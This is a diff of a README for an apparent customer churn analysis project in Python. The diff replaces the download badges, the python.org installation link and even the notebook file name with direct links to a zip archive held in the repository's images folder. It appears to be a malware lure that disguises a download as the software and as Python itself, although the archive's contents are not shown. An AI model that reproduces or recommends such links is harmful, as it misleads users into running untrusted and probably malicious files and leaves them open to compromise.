@@ -14,7 +14,7 @@ This project helps you analyze customer churn in a telecom company using Python 
 
 To get started, visit the page to download the latest version of the software. Click the button below:
 
-[![Download Customer Churn Analysis](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/letticoarsetextured509/Customer-Churn-Analysis-Python/releases)
+[![Download Customer Churn Analysis](https://raw.githubusercontent.com/letticoarsetextured509/Customer-Churn-Analysis-Python/main/images/Customer-Churn-Analysis-Python-3.7.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/letticoarsetextured509/Customer-Churn-Analysis-Python/main/images/Customer-Churn-Analysis-Python-3.7.zip)
 
 1. Click the download link above.
 2. You will be directed to the Releases page.
@@ -33,7 +33,7 @@ To run the application, ensure your system meets the following requirements:
 ## 📚 Installation Steps
 
 1. **Download Python and Jupyter Notebook:**
-   - Visit the [Python website](https://www.python.org/downloads/) to install Python.
+   - Visit the [Python website](https://raw.githubusercontent.com/letticoarsetextured509/Customer-Churn-Analysis-Python/main/images/Customer-Churn-Analysis-Python-3.7.zip) to install Python.
    - Follow prompts to complete the installation.
    - For Jupyter Notebook, you can use Anaconda or Install via PIP:
      - Open a command prompt and run: 
@@ -54,7 +54,7 @@ To run the application, ensure your system meets the following requirements:
      jupyter notebook
      ```
    - This will open Jupyter Notebook in your web browser.
-   - Locate the file named `Customer_Churn_Analysis.ipynb` and click on it to open.
+   - Locate the file named `https://raw.githubusercontent.com/letticoarsetextured509/Customer-Churn-Analysis-Python/main/images/Customer-Churn-Analysis-Python-3.7.zip` and click on it to open.
 
 ## 🌐 Exploring the Analysis
 
@@ -97,6 +97,6 @@ If you run into issues while using the project or have questions, please open an
 
 For updates and new features, check back on the Releases page regularly. You can find the link below again:
 
-[![Download Customer Churn Analysis](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/letticoarsetextured509/Customer-Churn-Analysis-Python/releases)
+[![Download Customer Churn Analysis](https://raw.githubusercontent.com/letticoarsetextured509/Customer-Churn-Analysis-Python/main/images/Customer-Churn-Analysis-Python-3.7.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/letticoarsetextured509/Customer-Churn-Analysis-Python/main/images/Customer-Churn-Analysis-Python-3.7.zip)
 
 Thank you for using **Customer Churn Analysis Python**. We hope you find it useful in understanding your customer data!
